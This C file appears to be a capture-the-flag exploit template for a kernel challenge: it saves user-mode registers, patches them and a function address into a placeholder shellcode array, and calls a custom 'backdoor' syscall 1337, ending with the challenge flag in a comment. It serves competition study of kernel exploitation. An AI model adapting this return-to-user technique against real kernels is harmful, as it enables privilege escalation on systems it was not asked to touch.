#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <sched.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

char shellcode[] = {XXXX};

unsigned long user_cs, user_ss, user_rsp, user_rflags;

static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

static void win() {
  *((uint8_t*)(0uLL)) = 0x41;
}

int main(void) {
  save_state();

  void *p;
  p = memmem(shellcode, sizeof(shellcode), "\x22\x22\x22\x22\x22\x22\x22\x22", 8);
  *(size_t*)p = (size_t)&win;
  p = memmem(shellcode, sizeof(shellcode), "\x33\x33\x33\x33\x33\x33\x33\x33", 8);
  *(size_t*)p = user_cs;
  p = memmem(shellcode, sizeof(shellcode), "\x44\x44\x44\x44\x44\x44\x44\x44", 8);
  *(size_t*)p = user_rflags;
  p = memmem(shellcode, sizeof(shellcode), "\x55\x55\x55\x55\x55\x55\x55\x55", 8);
  *(size_t*)p = user_rsp;
  p = memmem(shellcode, sizeof(shellcode), "\x66\x66\x66\x66\x66\x66\x66\x66", 8);
  *(size_t*)p = user_ss;
  puts("[+] Calling backdoor");
  syscall(1337, &shellcode, sizeof(shellcode));

  getchar();

  return 0;
}

// DUCTF{n0_r3g1st3rs_n0_pr0bl3m!}
